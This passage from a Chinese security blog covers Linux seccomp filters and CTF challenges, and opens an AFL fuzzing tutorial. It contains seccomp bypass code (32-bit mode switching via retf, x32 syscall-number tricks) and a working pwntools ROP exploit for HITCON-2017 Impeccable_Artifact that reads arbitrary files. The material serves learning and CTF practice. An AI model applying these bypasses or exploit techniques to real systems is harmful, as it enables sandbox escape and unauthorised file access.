出来，即第二次调用 prctl 时的第三个参数：</p><pre><code>(gdb) p/x $rdx$1 = 0x7fffffffe480(gdb) x/2gx 0x7fffffffe4800x7fffffffe480:    0x00007fffffff0004    0x00007fffffffe490(gdb) x/4gx 0x00007fffffffe4900x7fffffffe490:    0x0000000000000020    0x0000003b000100150x7fffffffe4a0:    0x7fff000000000006    0x0000000000000006(gdb) dump memory dd 0x00007fffffffe490 0x00007fffffffe490+4*8</code></pre><p>然后使用 libseccomp 中的 scmp_bpf_disasm 反编译获取大致的过滤规则，通常需要根据反编译出来的结果去查找对应函数的意义：</p><pre><code class="bash">➜  seccomp scmp_bpf_disasm &lt; dd line  OP   JT   JF   K================================= 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4] 0001: 0x15 0x00 0x03 0xc000003e   jeq 3221225534 true:0002 false:0005 0002: 0x20 0x00 0x00 0x00000000   ld  $data[0] 0003: 0x15 0x01 0x00 0x0000003b   jeq 59   true:0005 false:0004 0004: 0x06 0x00 0x00 0x7fff0000   ret ALLOW 0005: 0x06 0x00 0x00 0x00000000   ret KILL</code></pre><p>使用 seccomp-tools 也可以进行解析。</p><h2 id="Seccomp-using-libseccomp"><a href="#Seccomp-using-libseccomp" class="headerlink" title="Seccomp using libseccomp"></a>Seccomp using libseccomp</h2><blockquote><p>根据 veritas501 的博客做的一些记录。</p></blockquote><p>这边需要先安装一些依赖才会有 <code>seccomp.h</code> 头文件：</p><pre><code class="bash">sudo apt-get install libseccomp-dev libseccomp2 seccomp</code></pre><p>具体在 <code>/usr/include/seccomp.h</code> 中，一些选项如下：</p><pre><code class="cpp">/* * seccomp actions *//** * Kill the process */#define SCMP_ACT_KILL           0x00000000U/** * Throw a SIGSYS signal */#define SCMP_ACT_TRAP           0x00030000U/** * Return the specified error code */#define SCMP_ACT_ERRNO(x)       (0x00050000U | ((x) &amp; 0x0000ffffU))/** * Notify a tracing process with the specified value */#define SCMP_ACT_TRACE(x)       (0x7ff00000U | ((x) &amp; 0x0000ffffU))/** * Allow the syscall to be executed */#define SCMP_ACT_ALLOW          0x7fff0000U</code></pre><p><code>seccomp_init()</code> 用于初始化过滤状态：</p><pre><code class="cpp">/** * Initialize the filter state * @param def_action the default filter action * * This function initializes the internal seccomp filter state and should * be called before any other functions in this library to ensure the filter * state is initialized.  Returns a filter context on success, NULL on failure. * */scmp_filter_ctx seccomp_init(uint32_t def_action);</code></pre><p><code>seccomp_rule_add()</code> 用于添加新的规则。其中如果 <code>arg_cnt</code> 不为 0，那么 <code>arg_cnt</code> 表示后面限制的参数的个数，故只有参数满足要求时才会拦截：</p><pre><code class="cpp">/** * Add a new rule to the filter * @param ctx the filter context * @param action the filter action * @param syscall the syscall number * @param arg_cnt the number of argument filters in the argument filter chain * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended) * * This function adds a series of new argument/value checks to the seccomp * filter for the given syscall; multiple argument/value checks can be * specified and they will be chained together (AND&#39;d together) in the filter. * If the specified rule needs to be adjusted due to architecture specifics it * will be adjusted without notification.  Returns zero on success, negative * values on failure. * */int seccomp_rule_add(scmp_filter_ctx ctx,                     uint32_t action, int syscall, unsigned int arg_cnt, ...);** * Specify an argument comparison struct for use in declaring rules * @param arg the argument number, starting at 0 * @param op the comparison operator, e.g. SCMP_CMP_* * @param datum_a dependent on comparison * @param datum_b dependent on comparison, optional */#define SCMP_CMP(...)           ((struct scmp_arg_cmp){__VA_ARGS__})/** * Specify an argument comparison struct for argument 0 */#define SCMP_A0(...)            SCMP_CMP(0, __VA_ARGS__)/** * Specify an argument comparison struct for argument 1 */#define SCMP_A1(...)            SCMP_CMP(1, __VA_ARGS__)/** * Specify an argument comparison struct for argument 2 */#define SCMP_A2(...)            SCMP_CMP(2, __VA_ARGS__)/** * Specify an argument comparison struct for argument 3 */#define SCMP_A3(...)            SCMP_CMP(3, __VA_ARGS__)/** * Specify an argument comparison struct for argument 4 */#define SCMP_A4(...)            SCMP_CMP(4, __VA_ARGS__)/** * Specify an argument comparison struct for argument 5 */#define SCMP_A5(...)            SCMP_CMP(5, __VA_ARGS__)/** * Comparison operators */enum scmp_compare {        _SCMP_CMP_MIN = 0,        SCMP_CMP_NE = 1,                /**&lt; not equal */        SCMP_CMP_LT = 2,                /**&lt; less than */        SCMP_CMP_LE = 3,                /**&lt; less than or equal */        SCMP_CMP_EQ = 4,                /**&lt; equal */        SCMP_CMP_GE = 5,                /**&lt; greater than or equal */        SCMP_CMP_GT = 6,                /**&lt; greater than */        SCMP_CMP_MASKED_EQ = 7,         /**&lt; masked equality */        _SCMP_CMP_MAX,};/** * Argument datum */typedef uint64_t scmp_datum_t;/** * Argument / Value comparison definition */struct scmp_arg_cmp {        unsigned int arg;       /**&lt; argument number, starting at 0 */        enum scmp_compare op;   /**&lt; the comparison op, e.g. SCMP_CMP_* */        scmp_datum_t datum_a;        scmp_datum_t datum_b;};</code></pre><p><code>seccomp_load()</code> 用来应用规则：</p><pre><code class="cpp">/** * Loads the filter into the kernel * @param ctx the filter context * * This function loads the given seccomp filter context into the kernel.  If * the filter was loaded correctly, the kernel will be enforcing the filter * when this function returns.  Returns zero on success, negative values on * error. * */int seccomp_load(const scmp_filter_ctx ctx);</code></pre><p>同样用最简单的例子测试一下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;#include &lt;linux/seccomp.h&gt;char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_ALLOW);    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);    seccomp_load(ctx);    printf(&quot;###\n&quot;);    system(&quot;ls&quot;);    execve(args[0], args, 0);    return 0;}</code></pre><p>测试发现这里对 system 没有提示，直接过滤了，对 execve 会提示“invalid system call”。不过具体的功能是一样的：</p><pre><code class="bash">➜  seccomp ./sec###[1]    5480 invalid system call  ./sec</code></pre><h1 id="Bypass-Seccomp"><a href="#Bypass-Seccomp" class="headerlink" title="Bypass Seccomp"></a>Bypass Seccomp</h1><p>一般来说 64 位下的 Seccomp 会和前面的一样直接禁掉某个调用号。这种情况有一些方法可以对其绕过。</p><h2 id="绕过没有检查架构（arch）"><a href="#绕过没有检查架构（arch）" class="headerlink" title="绕过没有检查架构（arch）"></a>绕过没有检查架构（arch）</h2><p>一般题目里至少有 <code>SYS_mmap</code> 或 <code>SYS_mprotect</code> 能用，所以通常有机会执行任意 shellcode。通过下面的函数可以在 x86 和 x86_64 之间切换。<code>retf</code> 相当于 <code>POP IP</code> 和 <code>POP CS</code> 两条指令，而 32 位下 CS 为 0x23；64 位下 CS 为 0x33：</p><pre><code class="nasm">to32:    mov DWORD [rsp + 4], 0x23    retfto64:    mov DWORD [esp + 4], 0x33    retf</code></pre><p>假如程序的过滤规则和上面的一样，我们编写一个 <code>my_execve</code> 来调用：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;linux/filter.h&gt;extern void my_execve(void *, void *, void *);char *args[] = {    &quot;/bin/ls&quot;,    0,};int main() {    struct sock_filter filter[] = {        BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr        BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),    };    struct sock_fprog prog = {        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),        .filter = filter,    };    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);    my_execve(args[0], args, 0);}</code></pre><p><code>my_execve</code> 实现如下，因为 32 位下栈会少一半，所以为了防止程序 crash 需要搬一下栈：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    lea rsp, [stack]    call to32    mov eax, 11    mov ebx, edi    mov ecx, esi    int 0x80    retto32:    mov DWORD [rsp + 4], 0x23    retfsection .bss    resb 0x400stack:</code></pre><p>这样就可以成功执行 ls（如果开 sh 的话也没有办法执行命令的，因为 seccomp 的规则会在进程间继承）：</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>限制办法就是添加对 arch 的检查：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 3), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有过滤-X32-SYSCALL-BIT"><a href="#没有过滤-X32-SYSCALL-BIT" class="headerlink" title="没有过滤 __X32_SYSCALL_BIT"></a>没有过滤 <code>__X32_SYSCALL_BIT</code></h2><ul><li>在 x86_64 下的一种特殊模式，使用 64 位寄存器和 32 位地址。</li><li>x32 中 <code>nr</code> 会加 <code>__X32_SYSCALL_BIT</code>（0x40000000），见 <a href="https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/unistd.h" target="_blank" rel="noopener">include/uapi/asm/unistd.h</a>（<code>/usr/include/asm/unistd_x32.h</code>）</li><li>原本的系统调用号加上 0x40000000 是一样的效果</li></ul><p>把 my_execve 修改如下：</p><pre><code class="nasm">section .textglobal my_execvemy_execve:    mov rax, 59 + 0x40000000    syscall</code></pre><p>同样可以正常执行</p><pre><code class="bash">➜  seccomp ./secMakefile  dd  sec  sec.asm  sec.c  sec.o</code></pre><p>添加对系统调用号的检查来进行限制：</p><pre><code class="cpp">struct sock_filter filter[] = {    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch    BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 4), // arch == x86_64    BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -&gt; nr    BPF_JUMP(BPF_JMP + BPF_JSET, 0x40000000, 2, 0), // nr &amp; 0x40000000    BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),    BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),};</code></pre><h2 id="没有道理的绕过方法"><a href="#没有道理的绕过方法" class="headerlink" title="没有道理的绕过方法"></a>没有道理的绕过方法</h2><ul><li>部分调用号是给 x32 用的，但在 x86_64 下一样能用</li><li>59、520、59+0x40000000、520+0x40000000 都是 execve</li><li>322、322+0x40000000、545、545+0x40000000（stub_execveat，和 execve 类似）也可以</li></ul><h1 id="Binary-Test"><a href="#Binary-Test" class="headerlink" title="Binary Test"></a>Binary Test</h1><p>使用 seccomp-tools 对一些题目进行测试。</p><h2 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw-orw"></a>pwnable.tw-orw</h2><p>这道题当时是只能用 read、open、write 三个调用来读 flag。这里用 seccomp-tools 来查看一下是怎么实现的限制：</p><pre><code class="bash">$ seccomp-tools dump ./orw line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>可以看到先是检查了 arch 必须是 32 位，然后系统调用只允许 rt_sigreturn、sigreturn、exit_group、exit、open、read、write。</p><h2 id="0CTF-2018-mathgame"><a href="#0CTF-2018-mathgame" class="headerlink" title="0CTF-2018-mathgame"></a>0CTF-2018-mathgame</h2><p>这道题也是限制了 arch 和一些调用：</p><pre><code class="bash">$ seccomp-tools dump ./mathgameStarting system, please wait...System started! line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003 0002: 0x06 0x00 0x00 0x00000000  return KILL 0003: 0x20 0x00 0x00 0x00000000  A = sys_number 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0030: 0x06 0x00 0x00 0x00000000  return KILL</code></pre><h1 id="Related-CTF-Challs"><a href="#Related-CTF-Challs" class="headerlink" title="Related CTF Challs"></a>Related CTF Challs</h1><p>CTF 中涉及 Seccomp 的一些二进制题。记录一下用于在 IDA 中插入的 Seccomp 结构体：</p><pre><code class="cpp">struct sock_filter {    /* Filter block */    uint16_t    code;   /* Actual filter code */    uint8_t    jt;    /* Jump true */    uint8_t    jf;    /* Jump false */    uint32_t    k;      /* Generic multiuse field */};struct sock_fprog {    /* Required for SO_ATTACH_FILTER. */    unsigned short        len;    /* Number of filter blocks */    struct sock_filter *filter;};</code></pre><h2 id="HITCON-2017-seccomp"><a href="#HITCON-2017-seccomp" class="headerlink" title="HITCON-2017-seccomp"></a>HITCON-2017-seccomp</h2><p>先是一道逆向。程序不难，主要是逆 Seccomp 的部分来得出正确的 6 个参数。这里放一下<a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/" target="_blank" rel="noopener">其他大佬的 Writeup</a>：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  signed int i; // [rsp+Ch] [rbp-54h]  struct sock_fprog prog; // [rsp+10h] [rbp-50h]  __int64 args[6]; // [rsp+20h] [rbp-40h]  unsigned __int64 v7; // [rsp+58h] [rbp-8h]  v7 = __readfsqword(0x28u);  prog.len = 4059;  prog.filter = (struct sock_filter *)&amp;s;  memset(args, 0, sizeof(args));  for ( i = 0; i &lt;= 4; ++i )    _isoc99_scanf(&quot;%llu&quot;, &amp;args[i]);  prctl(38, 1LL, 0LL, 0LL, 0LL);  if ( prctl(22, 2LL, &amp;prog) )  {    perror(&quot;prctl&quot;);    exit(1);  }  syscall(4919LL, args[0], args[1], args[2], args[3], args[4], args[5]);  printf(&quot;Excellent! flag: hitcon{%s}\n&quot;, args);  return 0;}</code></pre><h2 id="HITCON-2017-Impeccable-Artifact"><a href="#HITCON-2017-Impeccable-Artifact" class="headerlink" title="HITCON-2017-Impeccable_Artifact"></a>HITCON-2017-Impeccable_Artifact</h2><p>程序保护全开，且能对栈上的任意 8 个字节进行读写，同时没有对下标进行检查，所以能造成任意地址读写。然后一开始在 prepare 函数中对 syscall 进行了限制：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  int c; // [rsp+8h] [rbp-658h]  int idx; // [rsp+Ch] [rbp-654h]  __int64 arr[201]; // [rsp+10h] [rbp-650h]  unsigned __int64 v7; // [rsp+658h] [rbp-8h]  v7 = __readfsqword(0x28u);  prepare();  memset(arr, 0, 0x640uLL);  while ( 1 )  {    menu();    idx = 0;    _isoc99_scanf(&quot;%d&quot;, &amp;c);    if ( c != 1 &amp;&amp; c != 2 )      break;    puts(&quot;Idx?&quot;);    _isoc99_scanf(&quot;%d&quot;, &amp;idx);    if ( c == 1 )    {      printf(&quot;Here it is: %lld\n&quot;, arr[idx]);    }    else    {      puts(&quot;Give me your number:&quot;);      _isoc99_scanf(&quot;%lld&quot;, &amp;arr[idx]);    }  }  return 0LL;}</code></pre><p>用 seccomp-tools 中可以查看到程序判断了系统架构，然后将传入的第三个参数作为系统调用号（即 rdx 等于 rax），后面会判断 sys_number 和 rdx 是否相等，如果相等也能过 check，这个地方可以构造出一些本身被限制的函数。然后允许 read、write、fstat 等一些函数：</p><pre><code> line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018 0002: 0x20 0x00 0x00 0x00000020  A = args[2] 0003: 0x07 0x00 0x00 0x00000000  X = A 0004: 0x20 0x00 0x00 0x00000000  A = sys_number 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014 0011: 0x87 0x00 0x00 0x00000000  A = X 0012: 0x54 0x00 0x00 0x00000001  A &amp;= 0x1 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019 0018: 0x06 0x00 0x00 0x00000000  return KILL 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</code></pre><p>经过调试可以找到某些地址泄漏 Binary 和 libc，然后改 ret 处的代码构造 ROP 就能任意文件读取：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./artifact&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Choice?\n&#39;)    p.sendline(str(c))def show(idx):    cmd(1)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Here it is:&#39;)    return int(p.recvuntil(&#39;\n&#39;, drop=True))def memo(idx, num):    cmd(2)    p.recvuntil(&#39;Idx?\n&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Give me your number:\n&#39;)    p.sendline(str(num))def leave():    cmd(3)binary_base = show(202) - 0xbb0bss_buf = binary_base + 0x202000info(&#39;binary_base = &#39; + hex(binary_base))offset = 0x00007ffff7a2d830 - 0x7ffff7a0d000libc_base = show(203) - offsetinfo(&#39;libc_base = &#39; + hex(libc_base))pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; ret&#39;)))read_addr = libc_base + libc.symbols[&#39;read&#39;]write_addr = libc_base + libc.symbols[&#39;write&#39;]open_addr = libc_base + libc.symbols[&#39;open&#39;]def set_syscall(idx, syscall, rdi, rsi, rdx):    memo(idx, pop_rdi_ret)    memo(idx + 1, rdi)    memo(idx + 2, pop_rsi_ret)    memo(idx + 3, rsi)    memo(idx + 4, pop_rdx_ret)    memo(idx + 5, rdx)    memo(idx + 6, syscall)file_name_addr = bss_buf + 0x500buf_addr = bss_buf + 0x600set_syscall(203, read_addr, 0, file_name_addr, 0x20) # read file&#39;s nameset_syscall(210, open_addr, file_name_addr, 0, 2) # open&#39;s syscall number == 2set_syscall(217, read_addr, 3, buf_addr, 0x1000) # read file&#39;s contentset_syscall(224, write_addr, 1, buf_addr, 0x1000) # write to stdoutleave()p.sendline(&#39;exp.py\x00&#39;)p.interactive()</code></pre><h2 id="BSides-CTF-2015-Baby-Playpen-Fence"><a href="#BSides-CTF-2015-Baby-Playpen-Fence" class="headerlink" title="BSides-CTF-2015-Baby_Playpen_Fence"></a>BSides-CTF-2015-Baby_Playpen_Fence</h2><p>TODO</p><h2 id="BSides-CTF-2015-Big-Prison-Fence"><a href="#BSides-CTF-2015-Big-Prison-Fence" class="headerlink" title="BSides-CTF-2015-Big_Prison_Fence"></a>BSides-CTF-2015-Big_Prison_Fence</h2><p>TODO</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=gQXyZY7Ucjc" target="_blank" rel="noopener">https://www.youtube.com/watch?v=gQXyZY7Ucjc</a><br><a href="https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a><br><a href="https://www.linuxidc.com/Linux/2015-02/112913.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2015-02/112913.htm</a><br><a href="https://en.wikipedia.org/wiki/Seccomp" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Seccomp</a><br><a href="https://atum.li/2017/04/25/linuxsandbox/#seccomp" target="_blank" rel="noopener">https://atum.li/2017/04/25/linuxsandbox/#seccomp</a><br><a href="https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a><br><a href="https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact" target="_blank" rel="noopener">https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact</a><br><a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/" target="_blank" rel="noopener">https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzzing to Exploit</title>
    <link href="/2020/04/13/Fuzzing-to-Exploit/"/>
    <url>/2020/04/13/Fuzzing-to-Exploit/</url>
    
    <content type="html"><![CDATA[<p>AFL Fuzz 初体验。</p><a id="more"></a><blockquote><p>“Fuzzing is a Black Box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion.”</p></blockquote><h1 id="American-Fuzzy-Lop"><a href="#American-Fuzzy-Lop" class="headerlink" title="American Fuzzy Lop"></a>American Fuzzy Lop</h1><p>AFL（American Fuzzy Lop）是由安全研究员 Michal Zalewski（@lcamtuf）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。</p><ol><li>从源码编译程序时进行插桩，以记录代码覆盖率（Code Coverage）；</li><li>选择一些输入文件，作为初始测试集加入输入队列（queue）；</li><li>将队列中的文件按一定的策略进行“突变”；</li><li>如果经过变异文件更新了覆盖范围，则将其保留添加到队列中；</li><li>上述过程会一直循环进行，期间触发了 crash 的文件会被记录下来。</li></ol><p><img src="/pics/Fuzzing-to-Exploit/1.png" srcset="/img/loading.gif" alt></p><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><p>安装 AFL 的方式和一般源码编译的程序一样。其中 AFL 的 QEMU 模式常用于黑盒测试。但是因为 AFL 使用的 QEMU 版本太旧，<code>util/memfd.c</code> 中定义的函数 <code>memfd_create()</code> 会和 glibc 中的同名函数冲突，AFL 在 qemu_mode 文件夹下提供了一个脚本 build_qemu_support.sh，用于 patch 一个新的 QEMU。安装完成后，可以看到有以下这些命令：</p><pre><code class="bash">➜  afl-2.52b afl-afl-analyze     afl-clang++     afl-fuzz        afl-gcc         afl-plot        afl-showmap     afl-whatsupafl-clang       afl-cmin        afl-g++         afl-gotcpu      afl-qemu-trace  afl-tmin</code></pre><p>记录几个常用的命令：</p><table><thead><tr><th style="text-align:center">命令</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>afl-analyze</code></td><td style="text-align:center">以指定输入为基础对程序进行分析识别出程序合法输入的轮廓</td></tr><tr><td style="text-align:center"><code>afl-clang++</code>/<code>afl-clang</code></td></tr><tr><td style="text-align:center"><code>afl-cmin</code></td><td style="text-align:center">尝试找到与测试样例全集具有相同覆盖范围的最小子集</td></tr><tr><td style="text-align:center"><code>afl-fuzz</code></td><td style="text-align:center">AFL 进行 Fuzzing 的主程序</td></tr><tr><td style="text-align:center"><code>afl-g++</code>/<code>afl-gcc</code></td><td style="text-align:center">编译生成的文件可以通过设置 <code>LD_LIBRARY_PATH</code> 让程序加载经过 AFL 插桩的 <code>.so</code> 文件；或者可以直接加上 <code>--disable-shared</code> 进行静态编译</td></tr><tr><td style="text-align:center"><code>afl-gotcpu</code></td><td style="text-align:center">用于查看每个核心使用状态</td></tr><tr><td style="text-align:center"><code>afl-plot</code></td><td style="text-align:center">用于绘制各种状态指标的直观变化趋势</td></tr><tr><td style="text-align:center"><code>afl-showmap</code></td><td style="text-align:center">跟踪单个输入的执行路径，并打印程序执行的输出、捕获的元组</td></tr><tr><td style="text-align:center"><code>afl-tmin</code></td><td style="text-align:center">减小单个输入样例的大小</td></tr><tr><td style="text-align:center"><code>afl-whatsup</code></td><td style="text-align:center">用于查看每个 fuzzer 的运行状态和总体运行概况，加上 <code>-s</code> 选项只显示概况，其中的数据都是所有 fuzzer 的总和</td></tr></tbody></table><h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><p>本文主要记录怎么用 Fuzzing 对 PWN 题漏洞点寻找。首先可以在当前目录下新建一个文件夹 <code>in</code>，然后使用 tee 来记录下手动输入的一些测试样例：</p><pre><code class="bash">tee in/pattern.txt | ./binary</code></pre><p>接下来可以直接使用 <code>afl-fuzz</code> 对程序 Fuzzing。其中 <code>-i</code> 指定输入目录，<code>-o</code> 指定输出目录，<code>-Q</code> 表示使用 QEMU 模式：</p><pre><code class="bash">afl-fuzz -i in -o out -Q -- ./binary</code></pre><p>运行的时候可能会报错：</p><pre><code class="bash">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;[+] You have 1 CPU core and 1 runnable tasks (utilization: 100%).[*] Checking core_pattern...[-] Hmm, your system is configured to send core dump notifications to an    external utility. This will cause issues: there will be an extended delay    between stumbling upon a crash and having this information relayed to the    fuzzer via the standard waitpid() API.    To avoid having crashes misinterpreted as timeouts, please log in as root    and temporarily modify /proc/sys/kernel/core_pattern, like so:    echo core &gt;/proc/sys/kernel/core_pattern[-] PROGRAM ABORT : Pipe at the beginning of &#39;core_pattern&#39;         Location : check_crash_handling(), afl-fuzz.c:7275</code></pre><p>在执行 <code>afl-fuzz</code> 前，如果系统配置为将核心转储文件（core）通知发送到外部程序，将导致将崩溃信息发送到 Fuzzer 之间的延迟增大，进而可能将崩溃被误报为超时，所以得临时修改 core_pattern 文件：</p><pre><code class="bash">echo core | sudo tee /proc/sys/kernel/core_pattern</code></pre><p>接下来就可以开始 Fuzz：</p><p><img src="/pics/Fuzzing-to-Exploit/2.png" srcset="/img/loading.gif" alt></p><p>状态窗口中“cycles done”字段颜色的颜色可以作为何时停止测试的参考。随着周期数不断增大，其颜色也会由洋红色，逐步变为黄色、蓝色、绿色。当其变为绿色时，继续 Fuzzing 下去也很难有新的发现了，这时便可以通过 Ctrl-C 停止 <code>afl-fuzz</code>。在输出的 <code>out</code> 文件夹下的 <code>crashes</code>，可以看到测试得到使程序 crash 的几个样例：</p><pre><code class="bash">➜  crashes lsid:000000,sig:06,src:000000,op:havoc,rep:2  id:000001,sig:06,src:000000,op:havoc,rep:4  id:000002,sig:06,src:000000,op:havoc,rep:2  